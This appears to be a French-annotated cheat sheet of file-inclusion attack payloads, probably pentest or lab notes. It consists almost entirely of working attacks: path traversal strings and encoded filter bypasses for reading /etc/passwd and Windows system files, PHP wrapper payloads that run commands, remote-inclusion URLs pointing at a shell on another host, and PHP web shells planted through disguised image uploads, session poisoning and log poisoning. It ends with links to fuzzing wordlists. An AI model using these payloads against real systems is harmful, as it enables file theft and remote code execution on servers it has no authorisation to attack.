

```
C:\Windows\boot.ini
/windows/win.ini
/windows/system32/drivers/etc/hosts
/etc/passwd
```

## Bypass protection example

```
....//....//....//....//etc/passwd
/index.php?%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
../../../../etc/passwd%00
php://filter/read=convert.base64-encode/resource=config
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd
..././..././..././..././..././etc/passwd
```

## Wrapper

```
php://filter/read=convert.base64-encode/resource=config
```

```
echo '<?php system($_GET["cmd"]); ?>' | base64
# encoder URL la sortie
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

```
expect://id
```
## RFI

```
http://127.0.0.1/index.php
ftp://10.10.25.63/shell.php?cmd=id
\\10.10.25.63\shell.php?cmd=id
```

## File Upload

```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
./profile_images/shell.gif&cmd=id

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
zip://./profile_images/shell.jpg%23shell.php&cmd=id

php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## PHP Session Poisoning

```
http://94.237.53.113:55752/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
/var/lib/php/sessions/sess_2q6gnf7tg5eq2pqvab8fpn2ipl&cmd=id
```

## Log poisoning

```
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET['cmd']); ?>'

# Ou Burp Suite User agent
```
# Listes
## Listes Path Traversal:

Linux :
https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt

Windows :
https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt

## Listes fichiers intéressants :

Linux :
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux

Windows :
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
## Liste paramètres php :

https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt

# Autres listes :

https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt